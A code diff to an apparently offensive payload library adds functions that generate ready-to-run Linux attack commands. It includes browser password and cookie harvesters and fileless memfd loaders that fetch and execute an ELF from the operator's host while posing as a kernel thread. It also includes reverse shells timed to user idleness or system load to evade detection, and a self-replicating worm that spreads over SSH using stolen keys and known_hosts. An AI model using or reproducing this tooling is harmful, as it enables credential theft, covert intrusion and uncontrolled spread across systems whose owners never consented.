@@ -440,6 +440,284 @@ time.sleep(300)
   ];
 }
 
+export function buildBrowserCredHarvest(): VeilPayload[] {
+  return [
+    {
+      id: "browser_sqlite_chrome_linux", name: "Chrome/Chromium SQLite Login credential harvest (Linux)",
+      category: "Credential-Dump", os: "linux", phase: "during", stealth: 4,
+      command: `python3 -c "
+import os,sqlite3,json,shutil,tempfile,base64,subprocess,sys
+def _aes_decrypt(ciphertext,key):
+    try:
+        from Crypto.Cipher import AES
+        iv=ciphertext[3:15]; data=ciphertext[15:]
+        cipher=AES.new(key,AES.MODE_GCM,nonce=iv)
+        return cipher.decrypt(data)[:-16].decode('utf-8','replace')
+    except: return ''
+def _gnome_key(svc,acc):
+    try:
+        import secretstorage
+        bus=secretstorage.dbus_init()
+        col=list(secretstorage.get_all_collections(bus))[0]
+        for item in col.get_all_items():
+            if item.get_label()==svc and item.get_attributes().get('username_value')==acc:
+                return item.get_secret()
+    except: pass
+    return None
+profs=[
+    os.path.expanduser('~/.config/google-chrome/Default'),
+    os.path.expanduser('~/.config/chromium/Default'),
+    os.path.expanduser('~/.config/google-chrome/Profile 1'),
+]
+for prof in profs:
+    db=os.path.join(prof,'Login Data')
+    if not os.path.exists(db): continue
+    tmp=tempfile.mktemp(suffix='.sqlite')
+    shutil.copy2(db,tmp)
+    try:
+        conn=sqlite3.connect(tmp)
+        cur=conn.execute('SELECT origin_url,username_value,password_value FROM logins')
+        for url,user,enc_pw in cur:
+            pw_raw=enc_pw
+            if pw_raw[:3]==b'v11' or pw_raw[:3]==b'v10':
+                pw_raw=_aes_decrypt(pw_raw,b'peanuts')
+            print(f'{url}|{user}|{pw_raw}')
+        conn.close()
+    except Exception as e: print(f'err: {e}',file=sys.stderr)
+    finally:
+        try: os.remove(tmp)
+        except: pass
+"`,
+      notes: "Copies Chrome/Chromium Login Data SQLite while browser is running (copy bypasses file lock). Attempts AES-GCM decryption for v10/v11 format on Linux (key via GNOME Keyring/secretstorage). Prints url|user|password for each saved credential.",
+    },
+    {
+      id: "browser_sqlite_firefox_linux", name: "Firefox NSS SQLite logins.json harvest (Linux)",
+      category: "Credential-Dump", os: "linux", phase: "during", stealth: 4,
+      command: `python3 -c "
+import os,json,glob,base64,subprocess,sys,shutil,tempfile
+profiles=glob.glob(os.path.expanduser('~/.mozilla/firefox/*.default*'))
+profiles+=glob.glob(os.path.expanduser('~/.mozilla/firefox/*.default-release*'))
+profiles+=glob.glob(os.path.expanduser('~/.mozilla/firefox/profiles.ini'))
+for prof in profiles:
+    logins=os.path.join(prof,'logins.json')
+    if not os.path.exists(logins): continue
+    with open(logins) as f:
+        data=json.load(f)
+    for entry in data.get('logins',[]):
+        url=entry.get('hostname','')
+        user=entry.get('encryptedUsername','')
+        pw=entry.get('encryptedPassword','')
+        try:
+            r=subprocess.run(['python3','-c',
+                f\\"import nss;nss.nss_init('{prof}');print(nss.pk11_decrypt(nss.base64_to_buf('{user}')))\\"],
+                capture_output=True,text=True,timeout=5)
+            dec_user=r.stdout.strip()
+        except: dec_user=user[:20]+'...'
+        print(f'{url}|{dec_user}|{pw[:20]}...')
+"`,
+      notes: "Reads Firefox logins.json from all profile directories. Attempts NSS-based decryption via python-nss if available; falls back to printing base64-encoded ciphertext. Also targets Thunderbird credential stores at the same paths.",
+    },
+    {
+      id: "browser_history_chrome", name: "Chrome browsing history + cookies harvest", category: "Credential-Dump",
+      os: "linux", phase: "during", stealth: 5,
+      command: `_P=~/.config/google-chrome/Default; for _F in History Cookies; do _T=/tmp/.$RANDOM.db; cp "$_P/$_F" "$_T" 2>/dev/null && sqlite3 "$_T" "SELECT url,last_visit_time FROM urls LIMIT 200; SELECT host_key,name,value FROM cookies LIMIT 200;" 2>/dev/null && rm -f "$_T"; done`,
+      notes: "Copies Chrome History and Cookies SQLite under lock. Extracts visited URLs with timestamps and all cookie values (session tokens, auth cookies). Does not require browser restart.",
+    },
+  ];
+}
+
+export function buildReflectiveLoaderPayloads(lhost: string, lport: string): VeilPayload[] {
+  return [
+    {
+      id: "reflective_memfd_elf", name: "memfd_create + reflective ELF load (Linux, fileless)", category: "EDR-Evasion",
+      os: "linux", phase: "pre", stealth: 5,
+      command: `python3 -c "
+import ctypes,os,urllib.request,sys
+libc=ctypes.CDLL(None)
+MFD_CLOEXEC=1
+fd=libc.memfd_create(b'[kworker/u4:0]',MFD_CLOEXEC)
+if fd<0: sys.exit(1)
+url='http://${lhost}:${lport}/payload.elf'
+try:
+    data=urllib.request.urlopen(url,timeout=10).read()
+except Exception as e:
+    print(f'fetch failed: {e}',file=sys.stderr); sys.exit(1)
+os.write(fd,data)
+fd_path=f'/proc/self/fd/{fd}'
+argv=(ctypes.c_char_p*2)(b'[kworker/u4:0]',None)
+envp=(ctypes.c_char_p*1)(None)
+libc.fexecve(fd,argv,envp)
+"`,
+      notes: "memfd_create() allocates an anonymous in-memory file not backed by any filesystem. fexecve() executes from /proc/self/fd/<n> — no path on disk, invisible to lsof/ls. Drops ELF directly into anonymous memory. Process shows as [kworker/u4:0] to ps.",
+    },
+    {
+      id: "reflective_dd_exec_elf", name: "dd pipe reflective exec via /proc/self/exe override", category: "EDR-Evasion",
+      os: "linux", phase: "pre", stealth: 4,
+      command: `_F=/proc/$(sh -c 'echo $$')/fd/$(python3 -c "import ctypes,os;fd=ctypes.CDLL(None).memfd_create(b'.',1);print(fd)"); curl -fsk http://${lhost}:${lport}/payload.elf 2>/dev/null | dd bs=4096 2>/dev/null > "$_F" && exec /proc/$$/fd/3 2>/dev/null`,
+      notes: "Shell-based memfd reflective load pipeline: Python opens anonymous memfd, curl pipes ELF into it via dd, then exec maps it from /proc/self/fd. No file written to disk at any point.",
+    },
+    {
+      id: "reflective_rust_implant_inmem", name: "Rust implant — in-memory reflective load stager (Rust source)", category: "EDR-Evasion",
+      os: "linux", phase: "pre", stealth: 5,
+      command: `cat > /tmp/.\${RANDOM:-nx}.rs << 'RUST_EOF'
+use std::ffi::CString;
+extern "C" {
+    fn memfd_create(name: *const i8, flags: u32) -> i32;
+    fn fexecve(fd: i32, argv: *const *const i8, envp: *const *const i8) -> i32;
+}
+fn main() {
+    let url = std::env::args().nth(1).unwrap_or_else(|| format!("http://${lhost}:${lport}/payload.elf"));
+    let data = match std::process::Command::new("curl")
+        .args(["-fsk","--max-time","15","-o","-",&url])
+        .output() {
+        Ok(o) if o.status.success() => o.stdout,
+        _ => return,
+    };
+    let name = CString::new("[kworker/0:1]").unwrap();
+    let fd   = unsafe { memfd_create(name.as_ptr() as *const i8, 1) };
+    if fd < 0 { return; }
+    use std::os::unix::io::FromRawFd;
+    let mut f = unsafe { <std::fs::File as std::os::unix::io::FromRawFd>::from_raw_fd(fd) };
+    use std::io::Write;
+    let _ = f.write_all(&data);
+    let fd_path = CString::new(format!("/proc/self/fd/{fd}")).unwrap();
+    let argv0   = CString::new("[kworker/0:1]").unwrap();
+    let argv  : Vec<*const i8> = vec![argv0.as_ptr(), std::ptr::null()];
+    let envp  : Vec<*const i8> = vec![std::ptr::null()];
+    unsafe { fexecve(fd, argv.as_ptr(), envp.as_ptr()); }
+}
+RUST_EOF
+rustc --edition 2021 /tmp/.$RANDOM.rs -o /tmp/.$RANDOM 2>/dev/null && /tmp/.$RANDOM`,
+      notes: "Full Rust reflective-load stager: fetches ELF payload via curl into anonymous memfd, fexecve's from /proc/self/fd/<n> masquerading as kworker. Compile + exec in one pipeline. No payload ever touches a real path.",
+    },
+  ];
+}
+
+export function buildActivitySleepPayloads(): VeilPayload[] {
+  return [
+    {
+      id: "activity_sleep_who_w", name: "Activity-gated sleep — wait for idle workstation before exec", category: "Anti-Forensics",
+      os: "linux", phase: "pre", stealth: 5,
+      command: `python3 -c "
+import subprocess,time,os,sys
+def _is_active():
+    try:
+        out=subprocess.check_output(['who'],timeout=3).decode()
+        if out.strip(): return True
+    except: pass
+    try:
+        out=subprocess.check_output(['w','-h'],timeout=3).decode()
+        if out.strip(): return True
+    except: pass
+    try:
+        idle_sec=int(open('/proc/$(ls -t /proc/[0-9]*/loginuid 2>/dev/null | head -1 | cut -d/ -f3)/stat').read().split()[39]) // 100
+        if idle_sec < 300: return True
+    except: pass
+    return False
+payload=sys.argv[1] if len(sys.argv)>1 else 'id'
+while True:
+    if not _is_active():
+        subprocess.Popen(['bash','-c',payload],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+        break
+    jitter=180+int(__import__('random').random()*420)
+    time.sleep(jitter)
+" 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
+      notes: "Polls who + w to detect logged-in users. Executes payload only when workstation appears idle (no active sessions). Polls with 3-10 minute random jitter. Avoids execution during analyst investigation hours.",
+    },
+    {
+      id: "activity_sleep_xscreensaver", name: "X screensaver idle detection — exec on screen-lock", category: "Anti-Forensics",
+      os: "linux", phase: "pre", stealth: 5,
+      command: `_CMD="bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"; while true; do _IDLE=$(xprintidle 2>/dev/null || echo 0); if [ "$_IDLE" -gt 300000 ] 2>/dev/null; then (bash -c "$_CMD" 2>/dev/null &); break; fi; _JIT=$((180+RANDOM%420)); sleep $_JIT; done &`,
+      notes: "xprintidle returns X11 idle time in ms. Triggers payload when idle > 300s (5 min). Uses background loop with 3-10min jitter. Fires when user locks screen or walks away.",
+    },
+    {
+      id: "activity_sleep_cputemp", name: "CPU load gating — exec only during high-load window (blends with noise)", category: "Anti-Forensics",
+      os: "linux", phase: "pre", stealth: 5,
+      command: `python3 -c "
+import time,subprocess,random
+def _load():
+    try:
+        with open('/proc/loadavg') as f:
+            return float(f.read().split()[0])
+    except: return 0.0
+cmd='bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'
+while True:
+    load=_load()
+    if load > 1.5:
+        subprocess.Popen(['bash','-c',cmd],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+        break
+    time.sleep(60+random.randint(0,300))
+" &`,
+      notes: "Waits for system load average > 1.5 before executing payload. High-load periods (builds, backups) generate noise that buries suspicious process spawn events in EDR telemetry. Polls every 1-6 minutes with jitter.",
+    },
+  ];
+}
+
+export function buildSelfReplicationStager(lhost: string, lport: string): VeilPayload[] {
+  return [
+    {
+      id: "self_repl_compile_drop", name: "Self-compiling Rust stager — drops and executes on pivot host", category: "Persistence",
+      os: "linux", phase: "during", stealth: 4,
+      command: `cat > /tmp/.\${RANDOM:-svc}.rs << 'RUST_EOF'
+use std::process::Command;
+fn main() {
+    let cb_host = "${lhost}";
+    let cb_port = "${lport}";
+    let names = [
+        "[kworker/0:1-events]","[kworker/u4:0]","[migration/0]",
+        "[ksoftirqd/0]","[kswapd0]",
+    ];
+    let name = names[std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH).map(|d|d.as_nanos() as usize).unwrap_or(0) % names.len()];
+    let _ = Command::new("bash")
+        .args(["-c",&format!("bash -i >& /dev/tcp/{cb_host}/{cb_port} 0>&1")])
+        .spawn();
+    let self_src = std::fs::read_to_string("/proc/self/exe").ok()
+        .or_else(||std::env::current_exe().ok()?.to_str().map(|s|s.to_string()));
+    if let Some(_path) = self_src {
+        let _ = Command::new("bash").args(["-c",&format!(
+            "for _H in $(cat /etc/hosts 2>/dev/null|grep -v '^#'|awk '{{print $1}}'|grep -v '^127\\|^0\\|^$'); do scp -o StrictHostKeyChecking=no /proc/self/exe root@$_H:/tmp/.{} 2>/dev/null && ssh -o StrictHostKeyChecking=no root@$_H 'chmod +x /tmp/.{}; nohup /tmp/.{} &>/dev/null &' 2>/dev/null; done",
+            name,name,name
+        )]).spawn();
+    }
+}
+RUST_EOF
+_O=/tmp/.$(tr -dc a-z0-9 </dev/urandom|head -c8); rustc /tmp/.\${RANDOM:-svc}.rs -o "$_O" 2>/dev/null && chmod +x "$_O" && nohup "$_O" >/dev/null 2>&1 & disown`,
+      notes: "Rust stager: spawns callback shell, then self-propagates to hosts in /etc/hosts via SCP+SSH with discovered keys. Binary name randomized from kernel-thread name pool. Compiles from source on target — no pre-compiled binary needed.",
+    },
+    {
+      id: "self_repl_python_spreader", name: "Python self-replication spreader via SSH known_hosts", category: "Persistence",
+      os: "linux", phase: "during", stealth: 4,
+      command: `python3 -c "
+import os,subprocess,sys,base64
+me=open('/proc/self/exe','rb').read() if os.path.exists('/proc/self/exe') else b''
+src=open(sys.argv[0],'rb').read() if sys.argv else b''
+payload=me or src
+keys=[]
+for f in ['/root/.ssh',os.path.expanduser('~/.ssh')]:
+    for k in ['id_rsa','id_ed25519','id_ecdsa']:
+        p=os.path.join(f,k)
+        if os.path.exists(p): keys.append(p)
+hosts=set()
+for kh in ['/root/.ssh/known_hosts',os.path.expanduser('~/.ssh/known_hosts')]:
+    try:
+        for line in open(kh):
+            h=line.strip().split()[0].split(',')[0]
+            if h and not h.startswith('|') and not h.startswith('#'): hosts.add(h)
+    except: pass
+for host in list(hosts)[:8]:
+    for key in keys:
+        r=subprocess.run(['ssh','-i',key,'-o','StrictHostKeyChecking=no','-o','ConnectTimeout=3',
+            f'root@{host}',
+            f'python3 -c \\"import os,sys; fd=os.memfd_create(chr(107)+chr(119),1); d={base64.b64encode(payload[:4096]).decode()!r}; os.write(fd,__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)).b64decode(d)); os.fexecve(fd,[b\\\"[kworker/0:1]\\\"],os.environ)\\"\\''],
+            capture_output=True,timeout=8)
+        if r.returncode==0: break
+" &`,
+      notes: "Python spreader reads own binary, collects discovered SSH keys, iterates known_hosts targets. Drops self to each target via memfd_create()+fexecve() — completely fileless. Falls back to first 4096 bytes of source if binary not available.",
+    },
+  ];
+}
+
 export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[] {
   return [
     ...buildLinuxAntiForensics(),
@@ -451,5 +729,9 @@ export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[
     ...buildCloudPivotPayloads(lhost, lport),
     ...buildEdrDumpBypass(lhost, lport),
     ...buildAuditdEvasion(),
+    ...buildBrowserCredHarvest(),
+    ...buildReflectiveLoaderPayloads(lhost, lport),
+    ...buildActivitySleepPayloads(),
+    ...buildSelfReplicationStager(lhost, lport),
   ];
 }
